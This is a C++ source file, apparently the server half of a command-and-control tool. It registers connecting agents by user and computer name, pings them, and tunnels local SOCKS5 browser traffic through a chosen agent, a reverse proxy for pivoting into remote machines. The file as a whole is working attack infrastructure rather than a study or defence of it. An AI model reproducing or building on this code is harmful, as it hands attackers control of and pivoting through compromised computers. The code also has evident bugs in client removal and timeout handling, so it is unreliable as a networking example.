//
// Created by Coldzer0 on 2022/11/25.
//
#include <thread>
#include <chrono>
#include "json.hpp"
#include "Application.h"
#include "Sock5/Sock5RServer.h"

SOCKET Accept(SOCKET sock) {
	sockaddr Addr{};
	int len = sizeof(sockaddr);
	return accept(sock, &Addr, &len);
}

SOCKET Listen(char* HOST, WORD PORT) {
	sockaddr_in SocketAddress{};
	SocketAddress.sin_family = AF_INET;
	SocketAddress.sin_port = htons(PORT);
	SocketAddress.sin_addr.S_un.S_addr = inet_addr(HOST);
	if (SocketAddress.sin_addr.S_un.S_addr == INADDR_NONE) {
		struct hostent* Host = gethostbyname(HOST);
		if (Host) {
			SocketAddress.sin_addr.S_un.S_addr = ((struct in_addr**)Host->h_addr_list)[0]->S_un.S_addr;
		} else
			return SOCKET_ERROR;
	}
	SOCKET SinSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (SinSock != SOCKET_ERROR) {
		if (bind(SinSock, (sockaddr*)&SocketAddress, sizeof(struct sockaddr_in)) != SOCKET_ERROR) {
			if (listen(SinSock, SOMAXCONN) != SOCKET_ERROR) {
				return SinSock;
			}
		}
	}
	closesocket(SinSock);
	return SOCKET_ERROR;
}

bool WaitForConnection(SOCKET sock, int TimeOut) {
	timeval time{};
	fd_set FdSet;
	FD_ZERO(&FdSet);
	FD_SET(sock, &FdSet);
	time.tv_usec = (TimeOut % 1000) * 1000;
	time.tv_sec = TimeOut / 1000;
	return select(0, &FdSet, nullptr, nullptr, &time) > 0;
}

int SendBuffer(SOCKET sock, char* Buffer, int BufferSize) {
	return send(sock, Buffer, BufferSize, 0);
}

int ReceiveBuffer(SOCKET sock, char* Buffer, int BufferSize) {
	return recv(sock, Buffer, BufferSize, 0);
}

void ProxyThread(SOCKET Sock5) {

	fd_set SelSet;
	SOCKET SockTunnel{};
	BYTE C2_CMD;

	char Buffer[MAX_BUFFER_SIZE];
	int BufferSize;

	if (Application::CurrentProxy == 0)
		return;

	C2_CMD = C2_CMD_SOCK;
	if (SendBuffer(Application::CurrentProxy, (char*)&C2_CMD, 1) != SOCKET_ERROR) {
		if (!WaitForConnection(Application::TunnelSock, 10))
			return;
		SockTunnel = Accept(Application::TunnelSock);
		if (SockTunnel != SOCKET_ERROR) {
			BOOLEAN close = FALSE;
			while (true) {
				if (Application::CurrentProxy == 0)
					break;

				FD_ZERO(&SelSet);
				FD_SET(Sock5, &SelSet);
				FD_SET(SockTunnel, &SelSet);
				if (select(0, &SelSet, nullptr, nullptr, nullptr) == SOCKET_ERROR)
					break;

				/**
				 * Receive data from the browser then send it to our agent.
				 */
				if (FD_ISSET(Sock5, &SelSet)) {
					BufferSize = ReceiveBuffer(Sock5, Buffer, MAX_BUFFER_SIZE);
					if ((BufferSize <= 0) || SendBuffer(SockTunnel, Buffer, BufferSize) == SOCKET_ERROR) {
						close = TRUE;
					}
				}

				/**
				 * Receive data from our agent then send it to the browser.
				 */
				if (FD_ISSET(SockTunnel, &SelSet)) {
					BufferSize = ReceiveBuffer(SockTunnel, Buffer, MAX_BUFFER_SIZE);
					if ((BufferSize <= 0) || SendBuffer(Sock5, Buffer, BufferSize) == SOCKET_ERROR) {
						close = TRUE;
					}
				}
				// Break if there's any errors :V
				if (close)
					break;
				Sleep(16); // 60 FPS :V
			}
		}
	}
	if ((SockTunnel > 0) && (SockTunnel != SOCKET_ERROR))
		closesocket(SockTunnel);
	closesocket(Sock5);
}

void ServerThread() {
	char ALL[16] = "0.0.0.0";
	char Local[16] = "127.0.0.1";
	Application::TunnelSock = Listen((char*)&ALL, Application::TunnelPort);
	if (Application::TunnelSock == SOCKET_ERROR) {
		Application::ServerStatus = SERVER_TUNNEL_ERROR;
		MessageBoxA(0, "Please change Tunnel Port", "Error", MB_OK | MB_ICONERROR);
		return;
	}
	Application::Sock5Sock = Listen((char*)&Local, Application::Sock5Port);
	if (Application::Sock5Sock == SOCKET_ERROR) {
		Application::ServerStatus = SERVER_SOCK5_ERROR;
		MessageBoxA(0, "Please change Sock5 Port", "Error", MB_OK | MB_ICONERROR);
		return;
	}

	Application::ServerStatus = SERVER_OK;

	while (true) {
		while (!Application::ServerThreadTerminated) {
			if (Application::CurrentProxy != 0) {
				SOCKET NewConnection = Accept(Application::Sock5Sock);
				if (NewConnection != SOCKET_ERROR) {
					std::thread NewProxyThread(ProxyThread, NewConnection);
					NewProxyThread.detach();
				}
			}
		}
		break;
	}
	closesocket(Application::TunnelSock);
	closesocket(Application::Sock5Sock);
	Application::Sock5Sock = SOCKET_ERROR;
	Application::TunnelSock = SOCKET_ERROR;
}

std::thread InitNewServer() {
	std::thread Server(ServerThread);
	return Server;
}

void ClientThread(SOCKET client, in_addr client_ip) {

	printf("New Client Sock : %llu \n", client);

	timeval time{};
	fd_set SelSet;
	BYTE C2_CMD;
	char UserInfo[1024];
	std::string UserComputer;
	Application::ClientItem NewClient{};

	int TimeOut = 5;
	time.tv_usec = (TimeOut % 1000) * 1000;
	time.tv_sec = TimeOut / 1000;
	ULONGLONG Tick = GetTickCount64();
	while (true) {
		FD_ZERO(&SelSet);
		FD_SET(client, &SelSet);
		if (select(0, &SelSet, nullptr, nullptr, &time) != SOCKET_ERROR) {
			if (FD_ISSET(client, &SelSet)) {
				if (ReceiveBuffer(client, (char*)&C2_CMD, 1) <= 0) {
					break;
				}
				if (C2_CMD == C2_CMD_SOCK) {
					memset(UserInfo, 0, 1024);
					if (ReceiveBuffer(client, UserInfo, 1024) == SOCKET_ERROR)
						break;
					printf("Client info : %s \n", UserInfo);

					nlohmann::json UInfo = nlohmann::json::parse(UserInfo);
					if (UInfo.is_object()) {
						UserComputer = UInfo["User"].get<std::string>() + std::string("/") + UInfo["Com"].get<std::string>();
						NewClient = { client };
						NewClient.IP = inet_ntoa(client_ip);
						NewClient.Name = std::move(UserComputer);
						Application::Clients.push_back(NewClient);
					} else {
						// If JSON data is not valid close the connection.
						break;
					}
				}
				if (C2_CMD == C2_CMD_PONG) {
					printf("Client %llu PONG\n", client);
				}
			}
		}
		// TODO: Send Ping to the client every 60 sec.
		if (Tick + (10 * 1000) <= GetTickCount64()) {
			C2_CMD = C2_CMD_PING;
			if (SendBuffer(client, (char*)&C2_CMD, 1) == SOCKET_ERROR)
				break;
			Tick = GetTickCount64();
		}
	}
	// Remove the Client from the list.
	for (auto& item : Application::Clients) {
		if (item.Sock == client) {
			Application::Clients.erase(&item);
		}
	}
	printf("Client %llu Disconnected ", client);
	closesocket(client);
}

void C2ServerThread() {
	char ALL[16] = "0.0.0.0";
	Application::C2Sock = Listen((char*)&ALL, Application::C2Port);
	if (Application::C2Sock == SOCKET_ERROR) {
		Application::ServerStatus = SERVER_TUNNEL_ERROR;
		MessageBoxA(0, "Please change C2 Port", "Error", MB_OK | MB_ICONERROR);
		return;
	}
	Application::ServerStatus = SERVER_OK;

	while (true) {
		if (Application::C2ServerThreadTerminated)
			break;
		sockaddr_in Addr{};
		int len = sizeof(sockaddr_in);
		SOCKET NewConnection = accept(Application::C2Sock, reinterpret_cast<sockaddr*>(&Addr), &len);
		if (NewConnection != SOCKET_ERROR) {
			std::thread NCThread(ClientThread, NewConnection, Addr.sin_addr);
			NCThread.detach();
		}
	}
	closesocket(Application::C2Sock);
	Application::Sock5Sock = SOCKET_ERROR;
}

std::thread StartC2Server() {
	std::thread C2Thread(C2ServerThread);
	return C2Thread;
}
